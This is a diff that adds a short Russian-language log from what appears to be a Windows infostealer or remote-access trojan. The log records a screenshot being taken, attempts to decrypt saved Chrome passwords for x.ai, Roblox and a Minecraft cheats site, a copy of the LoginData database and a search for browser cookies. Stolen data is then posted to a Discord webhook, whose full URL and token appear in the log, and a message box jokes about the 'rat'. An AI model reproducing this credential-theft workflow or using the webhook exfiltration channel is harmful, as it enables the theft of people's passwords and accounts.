@@ -1,0 +1,13 @@
+2025-04-25 20:03:51,924 - INFO - Скриншот сохранён как screenshot.png
+2025-04-25 20:03:53,013 - WARNING - Не удалось расшифровать пароль для https://accounts.x.ai/sign-up: (87, 'CryptUnprotectData', 'Параметр задан неверно.')
+2025-04-25 20:03:53,013 - WARNING - Не удалось расшифровать пароль для https://www.roblox.com/login: (87, 'CryptUnprotectData', 'Параметр задан неверно.')
+2025-04-25 20:03:53,013 - WARNING - Не удалось расшифровать пароль для https://minecraft-cheats-site.onrender.com/: (87, 'CryptUnprotectData', 'Параметр задан неверно.')
+2025-04-25 20:03:53,014 - WARNING - Не удалось удалить LoginData.db: [WinError 32] Процесс не может получить доступ к файлу, так как этот файл занят другим процессом: 'C:\\Users\\USER\\AppData\\Local\\Temp\\tmpfhjokpld.db'
+2025-04-25 20:03:54,015 - WARNING - Не удалось удалить LoginData.db: [WinError 32] Процесс не может получить доступ к файлу, так как этот файл занят другим процессом: 'C:\\Users\\USER\\AppData\\Local\\Temp\\tmpfhjokpld.db'
+2025-04-25 20:03:55,016 - WARNING - Не удалось удалить LoginData.db: [WinError 32] Процесс не может получить доступ к файлу, так как этот файл занят другим процессом: 'C:\\Users\\USER\\AppData\\Local\\Temp\\tmpfhjokpld.db'
+2025-04-25 20:03:56,016 - WARNING - Не удалось удалить LoginData.db: [WinError 32] Процесс не может получить доступ к файлу, так как этот файл занят другим процессом: 'C:\\Users\\USER\\AppData\\Local\\Temp\\tmpfhjokpld.db'
+2025-04-25 20:03:57,017 - WARNING - Не удалось удалить LoginData.db: [WinError 32] Процесс не может получить доступ к файлу, так как этот файл занят другим процессом: 'C:\\Users\\USER\\AppData\\Local\\Temp\\tmpfhjokpld.db'
+2025-04-25 20:03:58,019 - WARNING - Chrome Cookies database not found
+2025-04-25 20:03:59,675 - DEBUG - Starting new HTTPS connection (1): discord.com:443
+2025-04-25 20:04:02,499 - DEBUG - https://discord.com:443 "POST /api/webhooks/1354501574440910993/JtAT0CqjLLuVm6PskbqbSqbTvnIr3FBVX3fOFj4jfrRYCmmBwDPxxoIyOBpkfxRi8P5_ HTTP/1.1" 200 None
+2025-04-25 20:04:18,943 - INFO - Message box 'ну как там ратка?' отображён
